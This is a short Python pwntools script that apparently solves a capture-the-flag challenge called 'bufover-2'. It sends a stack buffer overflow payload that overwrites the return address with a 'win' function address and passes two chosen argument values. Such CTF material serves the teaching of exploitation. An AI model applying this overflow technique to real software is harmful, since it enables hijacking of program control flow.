#!/usr/bin/env python
from pwn import *

p = process('./bufover-2')

winaddr = 0x80491c2
arg1 = 0x14b4da55
arg2 = 0xf00db4be

p.recvuntil(">")

payload = "A" * 28
payload += p32(winaddr)
payload += "A"* 4
payload += p64(arg1)
payload += p32(arg2)

p.sendline(payload)
p.interactive()